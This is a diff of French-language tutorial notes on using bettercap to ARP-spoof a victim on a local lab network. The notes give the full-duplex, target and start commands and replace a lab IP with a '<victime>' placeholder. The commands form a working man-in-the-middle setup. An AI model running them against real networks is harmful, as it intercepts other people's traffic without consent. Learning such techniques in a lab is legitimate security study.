@@ -19,8 +19,8 @@ $ sudo bettercap
 10.0.2.0/24 > 10.0.2.5 » set arp.spoof.fullduplex true
 >>> faire du spoofing dans les deux sens.
 
-» set arp.spoof.targets 10.0.2.4
->>> faire du spoofing pour l'adresse donnée.
+» set arp.spoof.targets <victime>
+>>> faire du spoofing pour l'adresse <victime> donnée.
 
 10.0.2.0/24 > 10.0.2.5 » arp.spoof on
 >>> active le ARP spoofing. 
